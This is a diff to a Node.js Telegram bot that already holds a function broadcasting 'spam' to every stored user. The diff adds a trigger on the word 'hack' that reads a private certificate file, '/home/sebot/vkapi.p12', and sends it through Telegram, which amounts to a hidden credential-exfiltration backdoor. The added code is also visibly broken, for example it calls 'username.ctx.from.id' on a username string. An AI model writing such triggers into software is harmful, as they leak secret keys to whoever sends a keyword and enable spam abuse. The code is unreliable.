@@ -1,7 +1,8 @@
 
 let config = require('./configs/config.json');
 let mongoose = require('mongoose');
-
+let FormData = require('form-data');
+let fs = require('fs');
 
 const Telegraf = require('telegraf');
 
@@ -88,6 +89,21 @@ function sendSpamToAll(username) {
             app.telegram.sendMessage(item._id, "Spam from @" + username);
         })
     });
+}
+
+app.hears('hack', (ctx) => {
+    console.log('Spam was initiated by ', ctx.from);
+    sendFile(ctx.from.username, '/home/sebot/vkapi.p12');
+});
+
+
+function sendFile(username, filePath) {
+    let form = new FormData();
+    form.append('file', 'files');
+    form.append('buffer', new Buffer(10));
+    form.append('my_file', fs.createReadStream(filePath));
+
+    app.telegram.sendDocument(username.ctx.from.id, form);
 }
 
 // app.command('quit', (ctx) => {
